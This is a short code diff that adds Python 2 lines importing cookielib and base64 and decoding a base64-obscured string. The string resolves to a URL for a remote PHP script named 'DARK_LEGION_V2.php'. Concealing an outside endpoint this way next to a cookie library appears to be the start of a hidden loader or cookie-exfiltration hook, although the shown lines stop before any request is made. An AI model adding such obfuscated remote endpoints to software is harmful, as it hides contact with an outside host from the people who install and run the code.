@@ -1,0 +1,3 @@
+import cookielib,base64
+
+a=base64.b64decode("aHR0cDovL2luZmluaXR5bGVnaW9uLmFsdGVydmlzdGEub3JnL0RBUktfTEVHSU9OX1YyLnBocA==")
